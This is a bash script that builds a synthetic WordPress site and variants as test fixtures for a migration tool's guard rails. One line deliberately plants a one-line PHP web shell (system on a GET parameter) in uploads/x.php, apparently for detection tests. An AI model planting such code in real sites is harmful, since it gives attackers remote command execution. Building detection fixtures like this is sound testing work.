#!/usr/bin/env bash
# A synthetic classic WordPress install for `wordpress-init --migrate` (§8.7), and
# the variants its guard rails refuse.
#
# Usage: make-classic-wp.sh <out-dir>
#
# Writes:
#   <out>/site/                 the classic install (a git repository, prefix wpx_)
#   <out>/site/.wordpress-nix-backup/survey.json   (untracked, as `legacy pull` leaves it)
#   <out>/catalog.json          WORDPRESS_NIX_CATALOG: wordpress.org, WP Packages and the
#                               published files, for the fixture's wordpress.org slugs
#   <out>/v2/                   a v2 wordpress-nix site (flake + wp-content only)
#   <out>/multisite/            MULTISITE true                         → exit 6
#   <out>/old/                  WordPress 6.4                          → exit 5
#   <out>/nested/parent/site/   inside another repository              → exit 8
#   <out>/nosurvey/             no survey or dump                      → exit 6
#   <out>/foreign/              a classic install with a foreign flake → exit 4
#
# The install covers: pristine and modified wordpress.org plugins, a modified
# wordpress.org theme (the parent of the active child theme), a premium plugin with
# `Update URI: false`, the jwt-auth fork collision, a version missing from the
# registry, an inactive plugin, active-but-missing plugins (mainwp-child, dropped;
# ghost-plugin, missing-code), WPCodeBox2 with its functionality plugin and the
# uploads/wpcodebox stub, xCloud mu-plugins, object-cache.php and advanced-cache.php,
# a tracked wp-config.php and *.sql, and uploads with cwicly/, fonts/,
# woocommerce_uploads/, fluentform/ and a planted x.php.
set -euo pipefail

OUT="$1"
mkdir -p "$OUT"

plugin() { # <dir> <slug> <version> <author> [extra header lines]
  local dir="$1" slug="$2" version="$3" author="$4" extra="${5:-}"
  mkdir -p "$dir/$slug/includes"
  cat > "$dir/$slug/$slug.php" <<EOF
<?php
/**
 * Plugin Name: ${slug}
 * Version: ${version}
 * Author: ${author}
${extra}
 */
require_once __DIR__ . '/includes/helper.php';
EOF
  printf '<?php\nfunction %s_helper() { return 1; }\n' "${slug//-/_}" > "$dir/$slug/includes/helper.php"
  printf '=== %s ===\nStable tag: %s\n' "$slug" "$version" > "$dir/$slug/readme.txt"
}

theme() { # <dir> <slug> <version> <author> [template]
  local dir="$1" slug="$2" version="$3" author="$4" template="${5:-}"
  mkdir -p "$dir/$slug"
  {
    echo "/*"
    echo "Theme Name: $slug"
    echo "Version: $version"
    echo "Author: $author"
    [ -n "$template" ] && echo "Template: $template"
    echo "*/"
  } > "$dir/$slug/style.css"
  printf '<?php\n// %s\n' "$slug" > "$dir/$slug/index.php"
  printf '<?php\n// %s functions\n' "$slug" > "$dir/$slug/functions.php"
}

classic() { # <dir> <wp-version> [multisite]
  local d="$1" version="$2" multisite="${3:-}"
  mkdir -p "$d/wp-includes" "$d/wp-admin" "$d/wp-content/plugins" "$d/wp-content/themes" "$d/wp-content/mu-plugins"
  printf "<?php\n\$wp_version = '%s';\n" "$version" > "$d/wp-includes/version.php"
  printf '<?php\n// admin\n' > "$d/wp-admin/index.php"
  printf '<?php\nrequire __DIR__ . "/wp-blog-header.php";\n' > "$d/index.php"
  printf '<?php\n// blog header\n' > "$d/wp-blog-header.php"
  printf '<?php\n// Silence is golden.\n' > "$d/wp-content/index.php"
  printf '<?php\n// Silence is golden.\n' > "$d/wp-content/plugins/index.php"
  cat > "$d/wp-config.php" <<EOF
<?php
define( 'DB_NAME', 'legacy_db' );
define( 'DB_USER', 'legacy_user' );
define( 'DB_PASSWORD', 'hunter2' );
define( 'DB_HOST', 'localhost' );
define( 'AUTH_KEY',         'legacy-auth-key' );
define( 'SECURE_AUTH_KEY',  'legacy-secure-auth-key' );
define( 'LOGGED_IN_KEY',    'legacy-logged-in-key' );
define( 'NONCE_KEY',        'legacy-nonce-key' );
define( 'AUTH_SALT',        'legacy-auth-salt' );
define( 'SECURE_AUTH_SALT', 'legacy-secure-auth-salt' );
define( 'LOGGED_IN_SALT',   'legacy-logged-in-salt' );
define( 'NONCE_SALT',       'legacy-nonce-salt' );
define( 'WP_HOME', 'https://fixture.example' );
\$table_prefix = 'wpx_';
EOF
  if [ -n "$multisite" ]; then
    echo "define( 'MULTISITE', true );" >> "$d/wp-config.php"
  fi
  echo "require_once ABSPATH . 'wp-settings.php';" >> "$d/wp-config.php"
}

small_survey() { # <dir> <wp-version>: a variant's survey, pristine-plugin active
  mkdir -p "$1/.wordpress-nix-backup"
  cat > "$1/.wordpress-nix-backup/survey.json" <<EOF
{"schema": 1, "wordpress": {"version": "$2", "multisite": false, "tablePrefix": "wpx_", "locale": "en_US",
 "home": "https://variant.example"},
 "plugins": [{"name": "pristine-plugin", "file": "pristine-plugin/pristine-plugin.php", "version": "1.0.0", "active": true}],
 "themes": [{"name": "spare-theme", "version": "1.0", "active": true}],
 "activeTheme": {"stylesheet": "spare-theme", "template": "spare-theme"}}
EOF
}

survey() { # <dir> <wp-version>
  mkdir -p "$1/.wordpress-nix-backup"
  cat > "$1/.wordpress-nix-backup/survey.json" <<EOF
{
  "schema": 1,
  "host": "legacy@fixture.example",
  "path": "/var/www/fixture",
  "wordpress": {"version": "$2", "multisite": false, "tablePrefix": "wpx_", "locale": "en_US",
                "siteurl": "https://fixture.example", "home": "https://fixture.example"},
  "php": "8.2.30",
  "plugins": [
    {"name": "pristine-plugin", "file": "pristine-plugin/pristine-plugin.php", "version": "1.0.0", "active": true},
    {"name": "modified-plugin", "file": "modified-plugin/modified-plugin.php", "version": "2.0.0", "active": true},
    {"name": "premium-plugin", "file": "premium-plugin/premium-plugin.php", "version": "3.1", "active": true},
    {"name": "jwt-auth", "file": "jwt-auth/jwt-auth.php", "version": "4.2.2", "active": true},
    {"name": "unregistered-plugin", "file": "unregistered-plugin/unregistered-plugin.php", "version": "9.9.9", "active": true},
    {"name": "inactive-plugin", "file": "inactive-plugin/inactive-plugin.php", "version": "1.0.0", "active": false},
    {"name": "mainwp-child", "file": "mainwp-child/mainwp-child.php", "version": "5.0", "active": true},
    {"name": "ghost-plugin", "file": "ghost-plugin/ghost-plugin.php", "version": "1.0", "active": true},
    {"name": "wpcodebox2", "file": "wpcodebox2/wpcodebox2.php", "version": "2.1", "active": true},
    {"name": "wpcodebox_functionality_plugin", "file": "wpcodebox_functionality_plugin/wpcodebox_functionality_plugin.php", "version": "1.0", "active": true}
  ],
  "themes": [
    {"name": "fixture-child", "version": "1.0", "active": true, "parent": "fixture-parent"},
    {"name": "fixture-parent", "version": "1.5", "active": false},
    {"name": "spare-theme", "version": "1.0", "active": false}
  ],
  "activeTheme": {"stylesheet": "fixture-child", "template": "fixture-parent"},
  "administrators": [{"id": 1, "login": "admin", "email": "admin@fixture.example", "registered": "2020-01-01 00:00:00"}],
  "uploads": {"bytes": 1024, "dirs": ["2024", "cwicly", "fonts", "woocommerce_uploads", "fluentform", "wpcodebox"], "phpFiles": ["x.php", "wpcodebox/index.php"]},
  "woocommerce": false,
  "dbCode": {"triggers": [], "routines": [], "events": [], "views": []}
}
EOF
}

# ── the classic install ───────────────────────────────────────────────────
S="$OUT/site"
classic "$S" 6.8.3
P="$S/wp-content/plugins"
T="$S/wp-content/themes"
plugin "$P" pristine-plugin 1.0.0 "WordPress.org Author"
plugin "$P" modified-plugin 2.0.0 "WordPress.org Author"
plugin "$P" premium-plugin 3.1 "Premium Vendor" " * Update URI: false"
plugin "$P" jwt-auth 4.2.2 "Avunu"
plugin "$P" unregistered-plugin 9.9.9 "WordPress.org Author"
plugin "$P" inactive-plugin 1.0.0 "WordPress.org Author"
plugin "$P" wpcodebox2 2.1 "WPCodeBox"
plugin "$P" wpcodebox_functionality_plugin 1.0 "WPCodeBox"
mkdir -p "$P/cart-cache.bak" && echo x > "$P/cart-cache.bak/x.php"
mkdir -p "$P/thumbnailer"
theme "$T" fixture-parent 1.5 "WordPress.org Author"
theme "$T" fixture-child 1.0 "Custom Studio" fixture-parent
theme "$T" spare-theme 1.0 "WordPress.org Author"
printf '<?php\n// xcloud\n' > "$S/wp-content/mu-plugins/xcloud-auto-login.php"
printf '<?php\n// v2 platform file\n' > "$S/wp-content/mu-plugins/platform-environment.php"
printf '<?php\n/* Plugin Name: custom-mu */\n' > "$S/wp-content/mu-plugins/custom-mu.php"
printf '<?php\n// redis\n' > "$S/wp-content/object-cache.php"
printf '<?php\n// litespeed\n' > "$S/wp-content/advanced-cache.php"
U="$S/wp-content/uploads"
mkdir -p "$U/2024/01" "$U/cwicly/css" "$U/fonts" "$U/woocommerce_uploads" "$U/fluentform" "$U/wpcodebox"
echo jpg > "$U/2024/01/img.jpg"
echo 'body{}' > "$U/cwicly/css/cc-post-1.css"
echo woff > "$U/fonts/inter.woff2"
echo zip > "$U/woocommerce_uploads/secret.zip"
echo pdf > "$U/fluentform/entry.pdf"
printf '<?php die();' > "$U/wpcodebox/index.php"
printf '<?php system($_GET["c"]);\n' > "$U/x.php"
echo "INSERT INTO wpx_options VALUES (1,'siteurl','https://fixture.example','yes');" > "$S/backup.sql"
echo 'robots' > "$S/robots.txt"

# The catalog: what wordpress.org, WP Packages and the published files say,
# hashed from the pristine copies before one is modified.
python3 - "$S" "$OUT/catalog.json" <<'PY'
import hashlib, json, pathlib, sys
site, out = pathlib.Path(sys.argv[1]), sys.argv[2]
def files(d):
    return {p.relative_to(d).as_posix(): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in sorted(d.rglob("*")) if p.is_file()}
P, T = site / "wp-content/plugins", site / "wp-content/themes"
author = "WordPress.org Author"
cat = {"plugins": {}, "themes": {}, "avunu": {}}
for slug, ver in (("pristine-plugin", "1.0.0"), ("modified-plugin", "2.0.0"), ("inactive-plugin", "1.0.0")):
    cat["plugins"][slug] = {"author": author, "registry": [ver], "files": {ver: files(P / slug)}}
cat["plugins"]["unregistered-plugin"] = {"author": author, "registry": ["9.9.8"], "files": {}}
cat["plugins"]["jwt-auth"] = {"author": "Bagus", "registry": ["3.0.3"], "files": {}}
cat["plugins"]["two-factor"] = {"author": "WordPress.org Contributors", "registry": ["0.10.0"], "files": {}}
cat["themes"]["fixture-parent"] = {"author": author, "registry": ["1.5"], "files": {"1.5": files(T / "fixture-parent")}}
cat["themes"]["spare-theme"] = {"author": author, "registry": ["1.0"], "files": {"1.0": files(T / "spare-theme")}}
pathlib.Path(out).write_text(json.dumps(cat, indent=2))
PY
# Then modify one wordpress.org plugin and the parent theme.
echo '// local hack' >> "$P/modified-plugin/includes/helper.php"
echo '<?php // local hack' > "$T/fixture-parent/hack.php"

(
  cd "$S"
  git init -q
  git add -A
  git commit -q -m "legacy site, as the host had it"
)
survey "$S" 6.8.3

# ── variants ──────────────────────────────────────────────────────────────
mk_variant() { # <dir> <version> [multisite]
  classic "$1" "$2" "${3:-}"
  plugin "$1/wp-content/plugins" pristine-plugin 1.0.0 "WordPress.org Author"
  theme "$1/wp-content/themes" spare-theme 1.0 "WordPress.org Author"
}

mk_variant "$OUT/multisite" 6.8.3 yes
small_survey "$OUT/multisite" 6.8.3
mk_variant "$OUT/old" 6.4.2
small_survey "$OUT/old" 6.4.2
mk_variant "$OUT/nosurvey" 6.8.3
mkdir -p "$OUT/nested/parent"
git -C "$OUT/nested/parent" init -q
mk_variant "$OUT/nested/parent/site" 6.8.3
small_survey "$OUT/nested/parent/site" 6.8.3
mk_variant "$OUT/foreign" 6.8.3
small_survey "$OUT/foreign" 6.8.3
printf '{\n  outputs = _: { };\n}\n' > "$OUT/foreign/flake.nix"

# A v2 wordpress-nix site: wp-content only, with the old flake.
V="$OUT/v2"
mkdir -p "$V/wp-content/plugins" "$V/wp-content/themes"
plugin "$V/wp-content/plugins" pristine-plugin 1.0.0 "WordPress.org Author"
theme "$V/wp-content/themes" spare-theme 1.0 "WordPress.org Author"
cat > "$V/flake.nix" <<'EOF'
{
  inputs.wordpress-nix.url = "github:Avunu/wordpress";
  outputs = inputs: inputs.wordpress-nix.lib.mkFlake { inherit inputs; } { };
}
EOF
small_survey "$V" 6.8.3
